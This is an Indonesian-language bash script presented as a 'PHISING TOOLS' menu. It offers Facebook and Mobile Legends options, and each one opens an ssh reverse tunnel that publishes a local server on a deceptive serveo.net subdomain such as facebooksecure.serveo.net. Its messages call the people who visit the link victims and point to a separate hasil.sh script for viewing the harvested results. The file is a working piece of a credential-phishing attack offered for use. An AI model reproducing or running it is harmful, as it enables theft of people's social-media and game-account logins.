clear                                                               
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo                                                 
pur='\033[35;1m' #purple                                            
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah                                              
pu='\033[37;1m' #putih                                              
ku='\033[33;1m' #kuning
echo $i" WELCOME To PHISING TOOLS"
echo $cy" PILIH LINK PHISING YANG SESUAI"
echo $cy" JIKA LOG BERJALAN,BERARTI  KORBAN SUDAH MASUK LINK"
echo $cy" BUKA TAB BARU, JALANKAN"$pur" hasil.sh" $cy"untuk melihat hasilnya"
echo $pur"___________________________________"
echo $pur" GENERATE LINK"
echo
echo $pur"["$ku"1"$pur"]"$ku" FACEBOOK LINK"
echo $pur"["$ku"2"$pur"]"$ku" MOBILE LEGENDS LINK"
echo $pur"___________________________________"
echo $pur"╭─["$pur"root@Phising"$pur"]"
read -p"╰─>> " pil
echo $pur"___________________________________"
if [ $pil = 1 ]
then
ssh -R facebooksecure.serveo.net:80:localhost:8080 serveo.net
fi

if [ $pil = 2 ]
then
ssh -R mobilelegends.serveo.net:80:localhost:8080 serveo.net
fi
